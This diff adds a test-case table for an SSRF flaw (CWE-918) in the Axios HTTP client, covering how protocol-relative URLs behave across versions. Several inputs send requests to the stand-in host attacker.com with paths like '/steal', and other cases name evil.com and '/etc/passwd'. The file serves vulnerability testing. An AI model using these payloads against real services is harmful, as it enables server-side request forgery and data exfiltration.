@@ -1,0 +1,14 @@
+# Axios SSRF Vulnerability Test Cases (CWE-918)
+
+# Format: TC_ID | Description | Axios_Version | Request_Input | Expected_Behavior
+
+TC1 | Benign relative path request | 1.3.6 | axios.get('/api/status') | Should request the same origin: https://example.com/api/status
+TC2 | Protocol-relative URL SSRF | 1.3.6 | axios.get('//attacker.com/steal') | Should request https://attacker.com/steal (demonstrates SSRF)
+TC3 | Double-slash with path | 1.4.0 | axios.get('//attacker.com//login') | Should request https://attacker.com/login (SSRF exploit)
+TC4 | URL containing malicious domain in path | 1.5.2 | axios.get('/https://attacker.com') | Should request https://example.com/https://attacker.com (no SSRF; safe)
+TC5 | Missing baseURL fallback | 1.6.0 | axios.get('data') with baseURL undefined | Should request https://example.com/data
+TC6 | Protocol-relative URL on patched version | 1.7.4 | axios.get('//attacker.com/steal') | Should throw an error or be rejected (fixed behavior)
+TC7 | Mixed case protocol-relative | 1.3.6 | axios.get('//Attacker.COM/steal') | Should request https://Attacker.COM/steal (SSRF)
+TC8 | Path-relative with backslashes | 1.3.6 | axios.get('\\evil.com\\data') | Should request https://example.com/\\evil.com\\data (safe)
+TC9 | Query injection via protocol-relative | 1.3.6 | axios.get('//attacker.com?url=internal') | Should request https://attacker.com?url=internal (SSRF)
+TC10 | Ensure no SSRF for file paths | 1.3.6 | axios.get('/etc/passwd') | Should request https://example.com/etc/passwd (no SSRF; reads file via HTTP route)
